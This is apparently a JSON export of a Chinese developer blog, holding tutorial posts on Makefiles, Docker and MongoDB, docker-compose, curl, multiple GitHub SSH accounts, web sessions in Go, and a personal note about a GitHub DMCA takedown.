配置文件修改client-config-dir\nvim server.conf\nclient-config-dir ccd\n\n#在ccd文件夹下建立以用户名(Common Name)为名称的文件\ncd ccd\n\nvi client1\nifconfig-push 10.8.0.2 255.255.255.0\n\nvi client2\nifconfig-push 10.8.0.3 255.255.255.0\n```\n\n\n\n### 6. 参考资料\n\n+ https://openvpn.net/community-resources/how-to/\n\n+ https://github.com/OpenVPN/easy-rsa\n\n+ https://tunnelblick.net/\n\n+ https://community.openvpn.net/openvpn/wiki/Concepts-Addressing","tags":["openvpn"],"categories":["系统"]},{"title":"Makefile的编写规则","url":"%2Fp%2F4cf47ff4.html","content":"\n\n\n### 1. Makefile 介绍\n\nMakefile文件由一系列规则（rules）构成。每条规则的形式如下。\n\n```bash\n<target> : <prerequisites> \n[tab]  <commands>\n```\n\n上面第一行冒号前面的部分，叫做\"目标\"（target），冒号后面的部分叫做\"前置条件\"（prerequisites）；第二行必须由一个tab键起首，后面跟着\"命令\"（commands）。\n\n\"目标\"是必需的，不可省略；\"前置条件\"和\"命令\"都是可选的，但是两者之中必须至少存在一个。\n\n每条规则就明确两件事：构建目标的前置条件是什么，以及如何构建。\n\n<!-- more -->\n\n##### 1.1 目标（target）\n\n一个目标（target）就构成一条规则。目标通常是文件名，指明Make命令所要构建的对象，目标可以是一个文件名，也可以是多个文件名，之间用空格分隔。\n\n除了文件名，目标还可以是某个操作的名字，这称为\"伪目标\"（phony target）。\n\n```makefile\nclean:\n      rm *.o\n```\n\n上面代码的目标是clean，它不是文件名，而是一个操作的名字，属于\"伪目标 \"，作用是删除对象文件。\n\n```bash\n$ make  clean\n```\n\n但是，如果当前目录中，正好有一个文件叫做clean，那么这个命令不会执行。因为Make发现clean文件已经存在，就认为没有必要重新构建了，就不会执行指定的rm命令。\n\n\n\n为了避免这种情况，可以明确声明clean是\"伪目标\"，写法如下。\n\n```makefile\n.PHONY: clean\nclean:\n        rm *.o temp\n```\n\n\n\n声明clean是\"伪目标\"之后，make就不会去检查是否存在一个叫做clean的文件，而是每次运行都执行对应的命令。\n\n\n\n如果Make命令运行时没有指定目标，默认会执行Makefile文件的第一个目标。\n\n```bash\nmake\n```\n\n\n\n##### 1.2 前置条件（prerequisites）\n\n前置条件通常是一组文件名，之间用空格分隔。它指定了\"目标\"是否重新构建的判断标准：只要有一个前置文件不存在，或者有过更新（前置文件的last-modification时间戳比目标的时间戳新），\"目标\"就需要重新构建。\n\n```makefile\nresult.txt: source.txt\n    cp source.txt result.txt\n```\n\n上面代码中，构建 result.txt 的前置条件是 source.txt 。如果当前目录中，source.txt 已经存在，那么`make result.txt`可以正常运行，否则必须再写一条规则，来生成 source.txt 。\n\n```makefile\nsource.txt:\n    echo \"this is the source\" > source.txt\n```\n\n\n\n上面代码中，source.txt后面没有前置条件，就意味着它跟其他文件都无关，只要这个文件还不存在，每次调用`make source.txt`，它都会生成。\n\n```bash\n$ make result.txt\n$ make result.txt\n```\n\n上面命令连续执行两次`make result.txt`。第一次执行会先新建 source.txt，然后再新建 result.txt。第二次执行，Make发现 source.txt 没有变动（时间戳晚于 result.txt），就不会执行任何操作，result.txt 也不会重新生成。\n\n##### 1.3 命令（commands）\n\n命令（commands）表示如何更新目标文件，由一行或多行的Shell命令组成。它是构建\"目标\"的具体指令，它的运行结果通常就是生成目标文件。\n\n每行命令之前必须有一个tab键。需要注意的是，每行命令在一个单独的shell中执行。这些Shell之间没有继承关系。\n\n```makefile\nvar-lost:\n    export foo=bar\n    echo \"foo=[$$foo]\"\n```\n\n上面代码执行后（`make var-lost`），取不到foo的值。因为两行命令在两个不同的进程执行。一个解决办法是将两行命令写在一行，中间用分号分隔。\n\n```makefile\nvar-kept:\n    export foo=bar; echo \"foo=[$$foo]\"\n```\n\n另一个解决办法是在换行符前加反斜杠转义。\n\n```makefile\nvar-kept:\n    export foo=bar; \\\n    echo \"foo=[$$foo]\"\n```\n\n\n\n\n\n### 2. Makefile文件的语法\n\n\n\n##### 2.1 井号（#）\n\n在Makefile中表示注释。\n\n\n\n##### 2.2 回声（echoing）\n\n正常情况下，make会打印每条命令，然后再执行，这就叫做回声（echoing）。\n\n在命令的前面加上@，就可以关闭回声。\n\n```makefile\ntest:\n    # 这是测试\n\ntest:\n    @# 这是测试\n```\n\n\n\n##### 2.3 通配符\n\n通配符（wildcard）用来指定一组符合条件的文件名。Makefile 的通配符与 Bash 一致，主要有星号（*）、问号（？）和 [...] 。比如， *.o 表示所有后缀名为o的文件。\n\n```makefile\nclean:\n        rm -f *.o\n```\n\n\n\n##### 2.4 模式匹配\n\nMake命令允许对文件名，进行类似正则运算的匹配，主要用到的匹配符是%。比如，假定当前目录下有 f1.c 和 f2.c 两个源码文件，需要将它们编译为对应的对象文件。\n\n```\n%.o: %.c\n\n等同于下面的写法。\n\nf1.o: f1.c\nf2.o: f2.c\n```\n\n使用匹配符%，可以将大量同类型的文件，只用一条规则就完成构建。\n\n\n\n##### 2.5 变量和赋值符\n\nMakefile 允许使用等号自定义变量。\n\n```makefile\ntxt = Hello World\ntest:\n    @echo $(txt)\n```\n\n上面代码中，变量 txt 等于 Hello World。调用时，变量需要放在 $( ) 之中。\n\n\n\n调用Shell变量，需要在美元符号前，再加一个美元符号，这是因为Make命令会对美元符号转义。\n\n```makefile\ntest:\n    @echo $$HOME\n```\n\n\n\n有时，变量的值可能指向另一个变量。\n\n```makefile\nv1 = $(v2)\n```\n\n上面代码中，变量 v1 的值是另一个变量 v2。这时会产生一个问题，v1 的值到底在定义时扩展（静态扩展），还是在运行时扩展（动态扩展）？如果 v2 的值是动态的，这两种扩展方式的结果可能会差异很大。\n\n为了解决类似问题，Makefile一共提供了四个赋值运算符 （=、:=、？=、+=），它们的区别请看[StackOverflow](http://stackoverflow.com/questions/448910/makefile-variable-assignment)。\n\n```bash\nVARIABLE = value\n# 在执行时扩展，允许递归扩展。\n\nVARIABLE := value\n# 在定义时扩展。\n\nVARIABLE ?= value\n# 只有在该变量为空时才设置值。\n\nVARIABLE += value\n# 将值追加到变量的尾端。\n```\n\n\n\n##### 2.6 内置变量（Implicit Variables）\n\nMake命令提供一系列内置变量，比如，`$(CC)` 指向当前使用的编译器，`$(MAKE)` 指向当前使用的Make工具。这主要是为了跨平台的兼容性，详细的内置变量清单见[手册](https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html)。\n\n```makefile\noutput:\n    $(CC) -o output input.c\n```\n\n\n\n##### 2.7 自动变量（Automatic Variables）\n\nMake命令还提供一些自动变量，它们的值与当前规则有关。主要有以下几个。\n\n+ ``$@``\n\n  `$@`指代当前目标，就是Make命令当前构建的那个目标。比如，`make foo`的`$@` 就指代foo。\n\n  ```bash\n  a.txt b.txt: \n      touch $@\n      \n  #等同于下面的写法。    \n   \n  a.txt:\n      touch a.txt\n  b.txt:\n      touch b.txt\n  ```\n\n+ `$<`\n\n  `$<` 指代第一个前置条件。比如，规则为 t: p1 p2，那么`$<` 就指代p1。\n\n  ```bash\n  a.txt: b.txt c.txt\n      cp $< $@ \n      \n  # 等同于下面的写法。\n  \n  a.txt: b.txt c.txt\n      cp b.txt a.txt \n  ```\n\n  \n\n+ `$?`\n\n  `$?` 指代比目标更新的所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，其中 p2 的时间戳比 t 新，`$?`就指代p2。\n\n  \n\n+ `$^`\n\n  `$^` 指代所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，那么 `$^` 就指代 p1 p2 。\n\n  \n\n+ `$*`\n\n  `$*` 指代匹配符 % 匹配的部分， 比如% 匹配 f1.txt 中的f1 ，`$*` 就表示 f1。\n\n  \n\n+ `$(@D)` 和 `$(@F)`\n\n  `$(@D)` 和 `$(@F)` 分别指向 `$@` 的目录名和文件名。比如，`$@`是 src/input.c，那么`$(@D)` 的值为 src ，`$(@F)` 的值为 input.c。\n\n  \n\n+ `$(<D)` 和 `$(<F)`\n\n  `$(<D)` 和 `$(<F)` 分别指向 `$<` 的目录名和文件名。\n\n\n\n下面是自动变量的一个例子。\n\n```makefile\ndest/%.txt: src/%.txt\n    @[ -d dest ] || mkdir dest\n    cp $< $@\n```\n\n上面代码将 src 目录下的 txt 文件，拷贝到 dest 目录下。首先判断 dest 目录是否存在，如果不存在就新建，然后，`$<` 指代前置文件（src/%.txt）， `$@` 指代目标文件（dest/%.txt）。\n\n\n\n##### 2.8 判断和循环\n\nMakefile使用 Bash 语法，完成判断和循环。\n\n```makefile\nifeq ($(CC),gcc)\n  libs=$(libs_for_gcc)\nelse\n  libs=$(normal_libs)\nendif\n```\n\n上面代码判断当前编译器是否 gcc ，然后指定不同的库文件。\n\n\n\n```makefile\nLIST = one two three\nall:\n    for i in $(LIST); do \\\n        echo $$i; \\\n    done\n\n# 等同于\n\nall:\n    for i in one two three; do \\\n        echo $i; \\\n    done\n```\n\n上面代码的运行结果。\n\n```bash\none\ntwo\nthree\n```\n\n\n\n##### 2.9 函数\n\nMakefile 还可以使用函数，格式如下。\n\n```bash\n$(function arguments)\n# 或者\n${function arguments}\n```\n\n\n\nMakefile提供了许多[内置函数](http://www.gnu.org/software/make/manual/html_node/Functions.html)，可供调用。下面是几个常用的内置函数。\n\n+ shell 函数\n\n  shell 函数用来执行 shell 命令\n\n  ```makefile\n  srcfiles := $(shell echo src/{00..99}.txt)\n  ```\n\n  \n\n+ wildcard 函数\n\n  wildcard 函数用来在 Makefile 中，替换 Bash 的通配符。\n\n  ```makefile\n  srcfiles := $(wildcard src/*.txt)\n  ```\n\n  \n\n+ subst 函数\n\n  subst 函数用来文本替换，格式如下。\n\n  ```makefile\n  $(subst from,to,text)\n  ```\n\n  下面的例子将字符串\"feet on the street\"替换成\"fEEt on the strEEt\"。\n\n  ```makefile\n  $(subst ee,EE,feet on the street)\n  ```\n\n  \n\n+ patsubst函数\n\n  patsubst 函数用于模式匹配的替换，格式如下。\n\n  ```makefile\n  $(patsubst pattern,replacement,text)\n  ```\n\n  下面的例子将文件名\"x.c.c bar.c\"，替换成\"x.c.o bar.o\"。\n\n  ```makefile\n  $(patsubst %.c,%.o,x.c.c bar.c)\n  ```\n\n  \n\n+ 替换后缀名\n\n  替换后缀名函数的写法是：变量名 + 冒号 + 后缀名替换规则。它实际上patsubst函数的一种简写形式。\n\n  ```makefile\n  min: $(OUTPUT:.js=.min.js)\n  ```\n\n  上面代码的意思是，将变量OUTPUT中的后缀名 .js 全部替换成 .min.js 。\n\n\n\n### 3. Makefile 的实例\n\n##### 3.1  删除\n\n```makefile\n.PHONY: cleanall cleanobj cleandiff\n\ncleanall : cleanobj cleandiff\n        rm program\n\ncleanobj :\n        rm *.o\n\ncleandiff :\n        rm *.diff\n```\n\n上面代码可以调用不同目标，删除不同后缀名的文件，也可以调用一个目标（cleanall），删除所有指定类型的文件。\n\n##### 3.2 编译C语言项目\n\n```makefile\nedit : main.o kbd.o command.o display.o \n    cc -o edit main.o kbd.o command.o display.o\n\nmain.o : main.c defs.h\n    cc -c main.c\nkbd.o : kbd.c defs.h command.h\n    cc -c kbd.c\ncommand.o : command.c defs.h command.h\n    cc -c command.c\ndisplay.o : display.c defs.h\n    cc -c display.c\n\nclean :\n     rm edit main.o kbd.o command.o display.o\n\n.PHONY: edit clean\n```\n\n\n\n##### 3.3 项目\n\n```makefile\n.SILENT :\n.PHONY : dep vet clean dist package test\n\nNAME := cistern\nPRE := oc\nROOF := fhyx.tech/oceans/$(NAME)\n\nWITH_ENV = env `cat .env 2>/dev/null | xargs`\nUNAME_S := $(shell uname -s)\nifeq ($(UNAME_S),Darwin)\n    HOST := $(shell scutil --get LocalHostName)\nelse\n    HOST := $(shell hostname)\nendif\n\nDATE := $(shell date '+%Y%m%dT%H%M')\nSTAMP := $(shell date +%s)\nUSER := $(shell echo ${USER})\nTAG:=$(shell git describe --tags --always)\nLDFLAGS:=-X $(ROOF)/settings.Name=$(NAME) -X $(ROOF)/cmd.version=$(TAG) -X $(ROOF)/cmd.built=$(DATE) -X $(ROOF)/cmd.buildStamp=$(STAMP) -X $(ROOF)/cmd.buildUser=$(USER) -X $(ROOF)/cmd.buildHost=$(HOST)\n\nCOMMANDS = vet clean dist\n.PHONY: $(COMMANDS)\n\nmain:\n\techo \"Building $(NAME)\"\n\tgo build -ldflags \"$(LDFLAGS)\" .\n\nhelp:\n\t@echo \"commands: $(COMMANDS)\"\n\nall: clean $(COMMANDS)\n\nvet:\n\techo \"Checking .\"\n\tgo vet -vettool=$(which shadow) -atomic -bool -copylocks -nilfunc -printf -rangeloops -unreachable -unsafeptr -unusedresult ./...\n\nclean:\n\techo \"Cleaning dist\"\n\trm -rf dist\n\trm -f $(NAME) $(NAME)-*\n\ndist/linux_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of linux\"\n\tmkdir -p dist/linux_amd64 && GOOS=linux GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -s -w\" -o dist/linux_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist/darwin_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of darwin\"\n\tmkdir -p dist/darwin_amd64 && GOOS=darwin GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -w\" -o dist/darwin_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist: clean dist/linux_amd64/$(NAME) dist/darwin_amd64/$(NAME)\n\npackage: dist\n\techo \"Packaging $(NAME)\"\n\tls dist/linux_amd64 | xargs tar -cvJf $(NAME)-linux-amd64-$(TAG).tar.xz -C dist/linux_amd64\n\n.PHONY: binary-deploy\nbinary-deploy:\n\t@echo \"copy binary to earth\"\n\t@scp dist/linux_amd64/??-* earth:dist/linux_amd64/\n\n.PHONY: package-upload\npackage-upload:\n\t@echo \"copy package.tar.?z to venus\"\n\t@scp *-linux-amd64-*.tar.?z gopkg:/var/www/gopkg/\n\ndocker-build: dist/linux_amd64/$(NAME)\n\techo \"Building docker image\"\n\tcp -rf Dockerfile* dist/\n\tdocker build -t fhyx/cistern:$(TAG) dist/\n\tdocker tag fhyx/cistern:$(TAG) fhyx/cistern:latest\n.PHONY: $@\n```\n\n\n\n```go\npackage cmd\n\nimport (\n\t\"fmt\"\n\t\"runtime\"\n\n\t\"github.com/spf13/cobra\"\n)\n\nvar (\n\tversion   = \"dev\"\n\tbuilt     = \"N/A\"\n\tbuildUser = \"None\"\n\tname      = \"cistern\"\n)\n\nvar versionCmd = &cobra.Command{\n\tUse:   \"version\",\n\tShort: \"Print the version number\",\n\tLong:  ``,\n\tRun: func(cmd *cobra.Command, args []string) {\n\t\tfmt.Printf(\"%s %s built %s by %s (%s %s-%s)\\n\", name, version, built, buildUser, runtime.Version(), runtime.GOOS, runtime.GOARCH)\n\t},\n}\n\nfunc init() {\n\tRootCmd.AddCommand(versionCmd)\n}\n\nfunc inDevelop() bool {\n\treturn version == \"dev\"\n}\n```\n\n\n\n### 4. 参考资料\n\n+ http://www.ruanyifeng.com/blog/2015/02/make.html\n+ https://blog.csdn.net/ruglcc/article/details/7814546\n+ http://www.gnu.org/software/make/manual/html_node/Special-Targets.html#Special-Targets\n","tags":["makefile"],"categories":["shell"]},{"title":"docker中使用mongodb","url":"%2Fp%2F6fa8633a.html","content":"\n### 1. 安装\n\n##### 1.1 安装 mongodb\n\n```bash\nmkdir ~/data\n\nsudo docker pull mongo:latest \n\n# 一定要把数据卷暴露出去, 这样方便数据迁移\nsudo docker run -d -p 27017:27017 --name mongo -v /home/liuwei/data:/data/db mongo:latest\n\nsudo docker exec -it mongo mongo\n```\n\n<!-- more -->\n\n\n\n##### 1.2 将数据迁移到新容器\n\nLet's start a new MongoDB container, this time running on port 37017 instead of the default 27017:\n\n```bash\n# Copy the data from the previous container \nsudo cp -r ~/data ~/data_clone  \n\n# Start another MongoDB container \nsudo docker run -d -p 37017:27017 -v ~/data_clone:/data/db mongo\n```\n\n\n\n### 2. 使用\n\n```sql\ndb.createCollection('cities') \ndb.cities.insert({ name: 'New York', country: 'USA' }) \ndb.cities.insert({ name: 'Paris', country: 'France' }) \ndb.cities.find()\n```\n\n\n\n### 3. 参考资料\n\n+ https://www.thachmai.info/2015/04/30/running-mongodb-container/\n\n+ docker-compose 使用mongodb 参考 {% post_link 2-linux系统/docker/docker-compose的一次实践 %}\n\n","tags":["mongodb"],"categories":["docker"]},{"title":"docker-compose的一次实践","url":"%2Fp%2F331c471e.html","content":"\n\n\n### 0. 前言\n\nDocker Compose 是 Docker 官方编排（Orchestration）项目之一，负责快速的部署分布式应用，它是由 `python` 编写。\n\n`Compose` 定位是定义和运行多个 Docker 容器的应用。`Compose` 有两个重点\n\n- `docker-compose.yml` `compose` 配置文件\n- `docker-compose` 命令行工具\n\n<!-- more -->\n\n### 1. 安装\n\nwindows 和 mac 中 `docker-compose` 在安装 `docker` 的时候就已经捆绑安装了。linux 中需要自己安装\n\n\n```bash\n# 版本可以去 github 查看最新的版本\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-(uname -s)-(uname -m)\" -o /usr/local/bin/docker-compose \n\n\nsudo chmod +x /usr/local/bin/docker-compose \n\ndocker-compose --version\n```\n\n\n\n### 2. 使用\n\n```bash\ndocker-compose up # 启动\ndocker-compose down # 关闭\n```\n\n> docker-compose.yml\n\n```yml\nversion: '3' # 定义版本，不指定默认为版本 1，新版本功能更多\n\n\nservices:\n\n  mongo4:\n    image: mongo:4\n    privileged: true\n    restart: unless-stopped\n    volumes:  \n      - $HOME/transcode/data/db/:/data/db/\n      - ./mongo/mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro\n    container_name: mongo4\n    environment:\n      MONGO_INITDB_ROOT_USERNAME: yx1\n      MONGO_INITDB_ROOT_PASSWORD: test\n      MONGO_INITDB_DATABASE: transcode_v1\n    network_mode: bridge # 加上不会创建默认的桥, 即有一个为空, 就会创建一个默认 network\n    ports: # 暴露端口信息\n      - \"47047:27017\"\n\n\n\n  transcode-service:\n    build: service # 指定 Dockerfile 所在文件夹的路径\n    privileged: true # 允许容器中运行一些特权命令\n    restart: unless-stopped\n    volumes:\n     - /var/lib/oceans/:/var/lib/oceans/\n    container_name: transcode-service\n    network_mode: host\n\n\n  transcode-webapi:\n    build: webapi\n    privileged: true\n    restart: unless-stopped\n    container_name: transcode-webapi\n    network_mode: host\n```\n\n\n\n然后在 webapi, service 文件夹内创建各自的 dockerfile 文件\n\n\n\n\n> ./mongo/mongo-init.js\n\n```javascript\ndb.createUser(\n    {\n        user: \"yx1\",\n        pwd: \"test\",\n        roles:[\n            {\n                role: \"readWrite\",\n                db:   \"transcode_v1\"\n            }\n        ]\n    }\n);\n```\n\n\n\n##### 2.1 默认网桥问题\n\ndocker-compose 启动后会自动创建一个网桥, 如果不想创建, 即每个容器都写上值, 不能为空\n\n```yaml\nnetwork_mode: bridge\n```\n\n参考: https://stackoverflow.com/a/43755216\n\n\n\n##### 2.2 mongo 启动后自动创建用户\n\n参考: https://stackoverflow.com/a/54064268\n\n\n\n### 3. 参考资料\n\n+ https://yeasy.gitbooks.io/docker_practice/compose/\n+ https://juejin.im/post/5d17442e518825559f46ed92","tags":["docker-compose"],"categories":["docker"]},{"title":"curl命令的使用总结","url":"%2Fp%2Fda64728.html","content":"\n[curl](http://curl.haxx.se/)是一种命令行工具，作用是发出网络请求，然后得到和提取数据，显示在\"标准输出\"（stdout）上面。\n\n### 1. 使用教程\n\n##### 1.1 查看网页源码和保存\n\n```bash\ncurl www.sina.com\n```\n\n如果要把这个网页保存下来，可以使用`-o`参数，这就相当于使用wget命令了。\n\n```bash\ncurl -o [文件名] www.sina.com\n```\n\n<!-- more -->\n\n##### 1.2 显示响应头信息\n\n`-i`参数可以显示http response的头信息，连同网页代码一起。`-I`参数则是只显示http response的头信息。\n\n```bash\ncurl -i www.sina.com\n```\n\n\n\n##### 1.3 显示通信过程\n\n`-v`参数可以显示一次http通信的整个过程，包括端口连接和http request头信息。\n\n```bash\ncurl -v www.sina.com\n```\n\n如果你觉得上面的信息还不够，那么下面的命令可以查看更详细的通信过程。\n\n```bash\ncurl --trace output.txt www.sina.com\ncurl --trace-ascii output.txt www.sina.com\n```\n\n运行后，请打开output.txt文件查看。\n\n\n\n### 2. 发送数据\n\n##### 2.1 发送GET\n\nGET方法相对简单，只要把数据附在网址后面就行。\n\n```bash\ncurl example.com/form.cgi?data=xxx\n```\n\n\n\n##### 2.2 发送POST\n\nPOST方法必须把数据和网址分开，curl就要用到--data参数。\n\n```bash\ncurl -X POST --data \"data=xxx\" example.com/form.cgi\n```\n\n如果你的数据没有经过表单编码，还可以让curl为你编码，参数是`--data-urlencode`。\n\n```bash\ncurl -X POST --data-urlencode \"date=April 1\" example.com/form.cgi\n\n# 如果编码前有=号, 需要提前编码\n--data-urlencode  'value=-vf scale=-2:360'   # 错误\n--data-urlencode  'value=-vf scale%3d-2:360' # 正确\n```\n\n\n\n##### 2.3 HTTP动词\n\ncurl默认的HTTP动词是GET，使用`-X`参数可以支持其他动词。\n\n```bash\ncurl -X DELETE www.example.com\n```\n\n\n\n##### 2.4 增加头信息\n\n有时需要在http request之中，自行增加一个头信息。`--header` 或 `-H `参数就可以起到这个作用。\n\n```bash\ncurl --header \"Content-Type:application/json\" http://example.com\n```\n\n\n\n##### 2.5 HTTP认证\n\n有些网域需要HTTP认证，这时curl需要用到`--user`参数。\n\n```bash\ncurl --user name:password example.com\n```\n\n\n\n##### 2.6 cookie\n\n使用`--cookie`参数，可以让curl发送cookie。\n\n```bash\ncurl --cookie \"name=xxx\" www.example.com\n```\n\n至于具体的cookie的值，可以从http response头信息的`Set-Cookie`字段中得到。\n\n\n\n`-c cookie-file`可以保存服务器返回的cookie到文件，`-b cookie-file`可以使用这个文件作为cookie信息，进行后续的请求。\n\n```bash\ncurl -c cookies http://example.com\ncurl -b cookies http://example.com\n```\n\n\n\n##### 2.7 User Agent字段\n\n这个字段是用来表示客户端的设备信息。服务器有时会根据这个字段，针对不同设备，返回不同格式的网页，比如手机版和桌面版。\n\n```bash\ncurl --user-agent \"[User Agent]\" [URL]\n```\n\n\n\n##### 2.8 Referer字段\n\n有时你需要在http request头信息中，提供一个referer字段，表示你是从哪里跳转过来的。\n\n```bash\ncurl --referer http://www.example.com http://www.example.com\n```\n\n\n\n##### 2.9 文件上传\n\n假定文件上传的表单是下面这样：\n\n```html\n<form method=\"POST\" enctype='multipart/form-data' action=\"upload.cgi\">\n　　　　<input type=file name=upload>\n　　　　<input type=submit name=press value=\"OK\">\n　　</form>\n```\n\n你可以用curl这样上传文件：\n\n```bash\ncurl --form upload=@localfilename --form press=OK [URL]\n```\n\n\n\n##### 2.10 终极命令\n\n```bash\ncurl --help\n```\n\n","tags":["curl"],"categories":["命令"]},{"title":"近期博客的折腾命运","url":"%2Fp%2F1dd7dc05.html","content":"\n\n\n### 1. github DMCA takedown\n\n前两天, 发现blog突然无法提交了. 去邮箱里看github发的邮件才知道有一篇博文涉及到jetbrains版权问题, 让24小时内处理, 后来完美错过了时间. 就直接被takedown了.\n\n\n\n### 2. 折腾过程\n\ntakedown后一脸懵逼, 在网上查询的解决方案基本都是给github发邮件, 请求删除仓库或者再给一次宽限24小时的处理时间. \n\n于是我试着发了一封邮件, 没想到10天后才得到回复 (这效率~~~). 回复的时间还在十一假期内, 虽然又给我了24小时处理, 又被我完美错过了.(!!!!!一定要定期查看邮件)\n\n<!-- more -->\n\n于是又想到了以下三个解决方案:\n\n+ 发邮件让 github 直接删除仓库(因为是blog, 本地有备份), 然后再重新建库.\n+ 部署到其他平台 (如 coding 或 自己的服务器上)\n+ 部署到小号的 github 上\n\n\n\n为了省事, 我最后的解决方案是:\n\n1. 先发送github给予删除仓库的邮件(截至到写blog的时间, 还没有得到回复) \n\n2. 然后在小号的github上创建了仓库. 然后把本地blog提交上去. 重新把域名绑定github page即可.\n\n   \n\n   \n\n> 为什么说折腾呢!!!!!!  \n\n\n\n在小号绑定CNAME时, 提示域名CNAME被占用, 要先删除之前的域名绑定, 因为之前的仓库被takedown了无法编辑删除, 小号仓库就无法添加.  真的是无fuck说\n\n\n\n后来小号又发了一封邮件说CNAME被占用, 回复让我在域名解析里加一条TXT记录, 照做后, 几天后就可以了.\n\n\n\n### 3. 事件教训\n\n+ 一样要提高版权意识.\n\n+ 定期查看邮件, 定期查看邮件, 定期查看邮件","categories":["个人记录"]},{"title":"github多帐号登录的问题","url":"%2Fp%2F899d7696.html","content":"\n\n\n### 1. 同一台电脑有2个github账号？\n\n+ 首先要为每个帐号生成公钥私钥对, 并且设置到 github 里, 参考 {% post_link 2-linux系统/git/github和gitee通过密钥来进行ssh连接 %}\n\n+ 修改 `~/.ssh/config`, 设置如下\n\n```bash\nHost unix2dos\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost levonfly\n        HostName github.com\n        IdentityFile ~/.ssh/github-levonfly\n        User levonfly\n```\n\n测试:\n```bash\nssh -T git@unix2dos\nssh -T git@levonfly\n```\n<!-- more -->\n\n+ 要修改仓库的 remote url, 对应 `~/.ssh/config` 所填写的值.  注意, 要修改 git@后面的这个值\n\n```bash\ngit remote set-url origin git@unix2dos:unix2dos/LevonRecord.git\n```\n\n\n\n- 一定要设置用户名和邮箱.否则虽然可以提交 commit, 但是不认识你是谁\n\n  \n\n- 建议 global 用一个,  其他项目用另外的用户名\n\n```bash\ngit config -l\n\ngit config --global user.name \"unix2dos\"\ngit config --global user.email \"levonfly@gmail.com\" \n\n\ngit config user.name \"levonfly\"\ngit config user.email \"6241425@qq.com\" \n```\n\n\n\n### 2. mac切换用户提交失败的问题\n\n提交总是出现permission denied的问题，用git config --global更新了username和email也不行。\n\nmac os原因是即便更新了username和email，mac在git push时还是会使用历史账号的密码。\n\n> 解决方法如下：\n\n1. 进入Keychain Access (不知道在哪儿的可以command+space查找)\n2. 在搜索框输入'git'进行查找，将找到的文件删掉，这里保存了历史账号的信息\n3. 删除之后重新用git config --global更新username和email即可，之后git push会要求你输入username和password\n4. done!\n\n\n参考: https://www.zhihu.com/question/23028445/answer/399033488\n\n\n\n\n### 3. 参考资料\n\n+ https://gist.github.com/jexchan/2351996\n+ https://www.zhihu.com/question/23028445/answer/399033488","tags":["github"],"categories":["git"]},{"title":"session的介绍和使用","url":"%2Fp%2F312a7a36.html","content":"\n\n\n### 0. 前言\n\n除了使用Cookie，Web应用程序中还经常使用Session来记录客户端状态。Session是服务器端使用的一种记录客户端状态的机制，使用上比Cookie简单一些，相应的也增加了服务器的存储压力。\n\n\n\nSession在用户第一次访问服务器的时候自动创建。客户端只保存sessionid到cookie中，而不会保存session，session销毁只能通过invalidate或超时(默认30分钟)，关掉浏览器并不会关闭session。\n\n<!-- more -->\n\n### 1. session 介绍\n\n##### 1.1 Session与Cookie的区别\n\ncookie与session最大的区别就是一个是将数据存放在客户端，一个是将数据存放在服务端。cookie是将信息都存放在客户端的浏览器内存或磁盘中，所以不是很安全，别人可以分析存放在本地的cookie数据来进行用户信息的盗窃或进行cookie欺骗。\n\n所以在安全性上session要好一些，session通信的一般实现形式是通过cookie来实现，与cookie不同的是，session只会保存一个sessionID在客户端，不会像cookie那样将具体的数据保存在客户端，session具体的数据只会保存在服务端上\n\n在Servlet中session数据是被封装在一个对象里，而这个对象会被保存在对象池中，客户端发生请求时会带上它的sessionID，服务端就会根据这个sessionID，来从对象池中获得相应的session对象，从对象中获得session的具体数据，服务端通过这个session数据来保持或改变与客户端会话的状态。\n\n\n\n##### 1.2 Session机制\n\n以上也介绍了Session有两个主要的东西，一个是SessionID，一个是存放在服务端对象池中的Session对象。\n\n客户端访问服务端的时候，会先判断这个客户端的请求数据中是否包含有SessionID，如果没有的话，就会认为这个客户端是第一次进行访问。因为是第一次访问，所以服务端会给客户端在对象池中创建一个Session对象（假设这个会话是需要维持的），并生成出这个对象的SessionID，接着会通过cookie将SessionID响应给客户端，同时会把Session对象放回对象池里。客户端接收响应数据后会将SessionID存放在本地，下一次再访问服务端的时候就会把SessionID给带上，服务端就能够通过SessionID获得相应的Session对象，Session就是以这样的一个机制维持会话状态的。\n\n\n\n##### 1.3 session 存储问题\n\nsession如何存储才是高效，是存在内存、文件还是数据库了？文件和数据库的存储方式都是将session的数据固化到硬盘上，操作硬盘的方式就是IO，IO操作的效率是远远低于操作内存的数据，因此文件和数据库存储方式是不可取的，所以将session数据存储到内存是最佳的选择。\n\n因此最好的解决方案就是使用分布式缓存技术，例如：memcached和redis，将session信息的存储独立出来也是解决session同步问题的方法。\n\n\n\n##### 1.4 session劫持防范\n\n其中一个解决方案就是sessionID的值只允许cookie设置，而不是通过URL重置方式设置，同时设置cookie的httponly为true,这个属性是设置是否可通过客户端脚本访问这个设置的cookie，第一这个可以防止这个cookie被XSS读取从而引起session劫持，第二cookie设置不会像URL重置方式那么容易获取sessionID。\n\n第二步就是在每个请求里面加上token，实现类似前面章节里面讲的防止form重复递交类似的功能，我们在每个请求里面加上一个隐藏的token，然后每次验证这个token，从而保证用户的请求都是唯一性。\n\n还有一个解决方案就是，我们给session额外设置一个创建时间的值，一旦过了一定的时间，我们销毁这个sessionID，重新生成新的session，这样可以一定程度上防止session劫持的问题。\n\n\n\n### 2. golang 使用 session\n\n+ github.com/gorilla/sessions\n\n```go\n// sessions.go\npackage main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n\n    \"github.com/gorilla/sessions\"\n)\n\nvar (\n    // key must be 16, 24 or 32 bytes long (AES-128, AES-192 or AES-256)\n    key = []byte(\"super-secret-key\")\n    store = sessions.NewCookieStore(key)\n)\n\nfunc secret(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Check if user is authenticated\n    if auth, ok := session.Values[\"authenticated\"].(bool); !ok || !auth {\n        http.Error(w, \"Forbidden\", 